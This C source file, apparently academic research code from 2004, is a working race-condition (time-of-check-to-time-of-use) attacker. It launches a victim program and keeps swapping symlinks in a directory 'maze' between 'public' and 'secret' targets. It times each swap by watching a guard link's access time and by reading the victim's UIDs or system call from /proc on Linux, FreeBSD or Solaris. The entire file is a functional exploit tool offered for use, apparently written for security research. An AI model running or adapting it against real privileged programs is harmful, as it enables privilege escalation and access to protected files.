/*
 * "Copyright (c) 2003 The Regents of the University  of California.  
 * All rights reserved.
 *
 * Permission to use, copy, modify, and distribute this software and its
 * documentation for any purpose, without fee, and without written agreement is
 * hereby granted, provided that the above copyright notice, the following
 * two paragraphs and the author appear in all copies of this software.
 * 
 * IN NO EVENT SHALL THE UNIVERSITY OF CALIFORNIA BE LIABLE TO ANY PARTY FOR
 * DIRECT, INDIRECT, SPECIAL, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING OUT
 * OF THE USE OF THIS SOFTWARE AND ITS DOCUMENTATION, EVEN IF THE UNIVERSITY OF
 * CALIFORNIA HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 * 
 * THE UNIVERSITY OF CALIFORNIA SPECIFICALLY DISCLAIMS ANY WARRANTIES,
 * INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 * AND FITNESS FOR A PARTICULAR PURPOSE.  THE SOFTWARE PROVIDED HEREUNDER IS
 * ON AN "AS IS" BASIS, AND THE UNIVERSITY OF CALIFORNIA HAS NO OBLIGATION TO
 * PROVIDE MAINTENANCE, SUPPORT, UPDATES, ENHANCEMENTS, OR MODIFICATIONS."
 *
 * Authors: Naveen Sastry (nks@cs), Rob Johnson (rtjohnso@cs), Nikita Borisov
 *          (nikitab@cs)
 * Date:    Sep 21, 2004
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/time.h>
#include <string.h>
#include <signal.h>
#include <sys/wait.h>
#include <time.h>
#include <sys/syscall.h>
#define _STRUCTURED_PROC 1 /* For solaris */
#include <sys/procfs.h>

int debug = 0;

/*
 * Synchronization methods.
 */
int wait_for_link_access(char *link)
{
  struct stat buf;
  struct timeval tv;
  struct timezone tz;
  struct timespec ts = {0, 1};

  gettimeofday(&tv, &tz);
  
  do {
    nanosleep(&ts, &ts);
    lstat(link, &buf);
  } while (buf.st_atime < tv.tv_sec);
  return 1;
}

enum {sm_atime, sm_none} synchronization_method = sm_atime;
char atime_guard_link[1000];
int wait_for_next_victim_operation(int pid)
{
  switch (synchronization_method) {
  case sm_atime:
    return wait_for_link_access(atime_guard_link);
  case sm_none:
    return 0;
  }
  return 0;
}

/*
 * Distinguishing methods.
 */
void get_victim_uids_linux(int pid, int *ruid, int *euid, int *suid, int *fsuid)
{
  static int statusfd = -1;
  char buf[1000];
  char *p;

  if (statusfd < 0) {
    sprintf(buf, "/proc/%d/status", pid);
    statusfd = open(buf, O_RDONLY);
    if (statusfd < 0) {
      perror("open status file");
      exit (0);
    }
  }

  lseek(statusfd, 0, SEEK_SET);
  read(statusfd, buf, sizeof(buf));
  p = strstr(buf, "Uid:");
  sscanf(p, "Uid: %d %d %d %d", ruid, euid, suid, fsuid);
}

void get_victim_uids_freebsd(int pid, int *ruid, int *euid)
{
  static int statusfd = -1;
  char buf[1000];

  if (statusfd < 0) {
    sprintf(buf, "/proc/%d/status", pid);
    statusfd = open(buf, O_RDONLY);
    if (statusfd < 0) {
      perror("open status file");
      exit (0);
    }
  }

  lseek(statusfd, 0, SEEK_SET);
  read(statusfd, buf, sizeof(buf));
  sscanf(buf, "%*s %*d %*d %*d %*d %*d,%*d %*s %*d,%*d %*d,%*d %*d,%*d %*s %d %d", euid, ruid);
}

void get_victim_uids_solaris(int pid, int *ruid, int *euid)
{
  static int statusfd = -1;
  char buf[1000];
  struct solaris_psinfo {
    int pr_flag;              /* process flags */
    int pr_nlwp;              /* number of lwps in the process */
    pid_t pr_pid;             /* process id */
    pid_t pr_ppid;            /* process id of parent */
    pid_t pr_pgid;            /* process id of process group leader */
    pid_t pr_sid;             /* session id */
    uid_t pr_uid;             /* real user id */
    uid_t pr_euid;            /* effective user id */
  } psbuf;

  if (statusfd < 0) {
    sprintf(buf, "/proc/%d/psinfo", pid);
    statusfd = open(buf, O_RDONLY);
    if (statusfd < 0) {
      perror("open psinfo file");
      exit (0);
    }
  }

  lseek(statusfd, 0, SEEK_SET);
  read(statusfd, &psbuf, sizeof(psbuf));
  *ruid = psbuf.pr_uid;
  *euid = psbuf.pr_euid;
}

int get_victim_syscall_solaris(int pid)
{
#ifdef PLATFORM_SunOS
  static int statusfd = -1;
  char buf[1000];
  psinfo_t psibuf;

  if (statusfd < 0) {
    sprintf(buf, "/proc/%d/psinfo", pid);
    statusfd = open(buf, O_RDONLY);
    if (statusfd < 0) {
      perror("open psinfo file");
      exit (0);
    }
  }

  lseek(statusfd, 0, SEEK_SET);
  read(statusfd, &psibuf, sizeof(psibuf));
  return psibuf.pr_lwp.pr_syscall;
#else
  return 0;
#endif
}

enum {dm_deterministic, dm_linux_fsuid, dm_freebsd_uid, 
      dm_solaris_uid, dm_solaris_syscall } 
  distinguisher_method = dm_deterministic;
int determine_current_victim_operation(int pid)
{
  switch (distinguisher_method) {
  case dm_deterministic:
    {
      static int last_operation = 1;
      int result;
      
      result = 1 - last_operation;
      last_operation = result;
      return result;
    }

  case dm_linux_fsuid:
    {
      int ruid, euid, suid, fsuid;
      get_victim_uids_linux(pid, &ruid, &euid, &suid, &fsuid);
      return fsuid == ruid ? 0 : 1;
    }
  case dm_freebsd_uid:
    {
      int ruid, euid;
      get_victim_uids_freebsd(pid, &ruid, &euid);
      return euid == ruid ? 0 : 1;
    }
  case dm_solaris_uid:
    {
      int ruid, euid;
      get_victim_uids_solaris(pid, &ruid, &euid);
      return euid == ruid ? 0 : 1;
    }
  case dm_solaris_syscall:
    {
      int syscall = get_victim_syscall_solaris(pid);
      return syscall == SYS_open;
    }
  }
  return 0;
}

/*
 * Cleanup on exit
 */
char start[1000];
char end[1000];
int ops[1000];
void victim_exit_handler(int signum)
{
  int i;
  int status;
  wait (&status);
  printf("Victim exit: %d\n", WEXITSTATUS(status));

  unlink(start);
  symlink("maze0", start);
  unlink(end);
  symlink("public", end);

  if (debug)
    for (i = 0; i < 1000 && ops[i] >= 0; i++)
      printf("ops[%d] = %d\n", i, ops[i]);

  exit(WEXITSTATUS(status));
}

int main (int argc, char **argv)
{
  int victimpid;
  char *basedir;
  int ndirs;
  int nlinks;
  char *victim_args[argc];
  char first[1000];
  char path[1000];
  int i;
  int status;
  int last_victim_operation;
  struct stat stat_buf;

  if (argc < 5) {
    printf("attacker <debug> <a|n> <f|u|d|s|S> <basedir> <ndirs> <nlinks> <victim> <victim args>\n"
	   "  debug:      debug level: 0 = no debugging, 1 = debugging\n"
	   "  a|n:        synchronization method: (a)time or (n)one\n"
	   "  f|u|d|s|S:  distinguisher method: (f)suid (Linux)\n"
	   "                                    (S)yscall number (Solaris)\n"
	   "                                    (u)id (FreeBSD)\n"
	   "                                    (s)olaris uid (doesn't work)\n"
	   "                                    (d)eterministic\n"
	   "  basedir:    base directory of mazes\n"
	   "  ndirs:      number of mazes\n"
	   "  nlinks:     number of chains per maze\n"
	   "  victim:     victim program\n"
	   "\n"
	   "Note: victim will be executed as \"victim victim_args path\"\n");
    exit(0);
  }

  debug = atoi(argv[1]);
  synchronization_method = argv[2][0] == 'a' ? sm_atime : sm_none;
  distinguisher_method = argv[3][0] == 'f' ? dm_linux_fsuid : 
    argv[3][0] == 'u' ? dm_freebsd_uid : 
    argv[3][0] == 's' ? dm_solaris_uid : 
    argv[3][0] == 'S' ? dm_solaris_syscall : dm_deterministic;
  basedir = argv[4];
  ndirs = atoi(argv[5]);
  nlinks = atoi(argv[6]);
  for (i = 0; i < argc - 7; i++)
    victim_args[i] = argv[i + 7];
  victim_args[argc - 7] = path;
  victim_args[argc - 6] = NULL;

  /* This combo won't work */
  if (synchronization_method == sm_none && 
      distinguisher_method == dm_deterministic) {
    printf("Cannot use deterministic distinguisher without a synchronization method\n");
    exit(0);
  }

  memset(ops, -1, sizeof(ops));

  signal(SIGCHLD, victim_exit_handler);

  sprintf(start, "%s/activemaze", basedir);
  sprintf(end, "%s/target", basedir);
  sprintf(first, "%s/sentry", start);
  strcpy(path, first);
  for (i = 0; i < nlinks; i++) {
    strcat(path, "/lnk");
  }

  strcpy(atime_guard_link, first);

  /* Make sure things we manipulate are already in memory, so _we_
     don't go to sleep on I/O.  */
  lstat(start, &stat_buf);
  lstat(end, &stat_buf);
  for (i = 0; i < ndirs; i++) {
    char sentry_buf[1000];
    sprintf(sentry_buf, "%s/maze%d/sentry", basedir, i);
    lstat(sentry_buf, &stat_buf);
  }

  if ((victimpid = fork()) == 0) {
    /* Victim */
    sleep(1);
    execvp(victim_args[0], victim_args);
    perror("execvp");
    return 1;
  }

  /* Attacker runs till victim exits */
  last_victim_operation = -1;
  for (i = 0; 1; i++) {
    int is_new_op;
    int operation;
    is_new_op = wait_for_next_victim_operation(victimpid);
    operation = determine_current_victim_operation(victimpid);
    if (!is_new_op && operation == last_victim_operation)
      continue;
    last_victim_operation = operation;

    if (debug && i < 1000)
      ops[i] = operation;

    unlink(end);
    if (operation == 0)
      symlink("public", end);
    else
      symlink("secret", end);

    unlink(start);
    sprintf(path, "maze%d", (i+1) % ndirs);
    symlink(path, start);
  }

  /* Should never get here, but... */
  wait(&status);
  return WEXITSTATUS(status);
}
